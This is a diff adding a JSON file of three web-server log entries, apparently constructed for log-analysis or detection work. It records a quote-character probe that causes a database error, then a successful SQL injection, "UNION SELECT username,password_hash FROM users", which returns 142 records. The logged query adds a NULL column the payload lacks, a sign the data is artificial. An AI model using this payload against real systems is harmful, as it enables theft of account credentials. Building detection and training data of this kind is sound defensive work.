@@ -1,0 +1,55 @@
+{
+  "logs": [
+    {
+      "log_id": "LOG-55101",
+      "timestamp": "2026-09-13T10:12:01Z",
+      "host": "web-server-03",
+      "source_ip": "10.20.14.52",
+      "proxy_ip": "192.168.1.10",
+      "method": "GET",
+      "endpoint": "/api/v1/health",
+      "query_params": {},
+      "status_code": 200,
+      "response_bytes": 42,
+      "user_agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
+      "message": "Health check endpoint accessed"
+    },
+    {
+      "log_id": "LOG-55102",
+      "timestamp": "2026-09-13T10:13:45Z",
+      "host": "web-server-03",
+      "source_ip": "10.20.14.52",
+      "proxy_ip": "192.168.1.10",
+      "method": "GET",
+      "endpoint": "/api/v1/users",
+      "query_params": {
+        "id": "1'"
+      },
+      "raw_request": "GET /api/v1/users?id=1' HTTP/1.1",
+      "status_code": 500,
+      "response_bytes": 412,
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "message": "Database query error: syntax error at or near \"'\""
+    },
+    {
+      "log_id": "LOG-55103",
+      "timestamp": "2026-09-13T10:14:21Z",
+      "host": "web-server-03",
+      "source_ip": "10.20.14.52",
+      "proxy_ip": "192.168.1.10",
+      "method": "GET",
+      "endpoint": "/api/v1/users",
+      "query_params": {
+        "id": "1' UNION SELECT username,password_hash FROM users--"
+      },
+      "raw_request": "GET /api/v1/users?id=1%27%20UNION%20SELECT%20username,password_hash%20FROM%20users-- HTTP/1.1",
+      "status_code": 200,
+      "response_bytes": 15420,
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "payload": "1' UNION SELECT username,password_hash FROM users--",
+      "sql_executed": "SELECT id, name, email FROM users WHERE id = '1' UNION SELECT username,password_hash,NULL FROM users--",
+      "records_returned": 142,
+      "message": "SQL query executed successfully. 142 records returned in 18ms. Data serialized to JSON response."
+    }
+  ]
+}
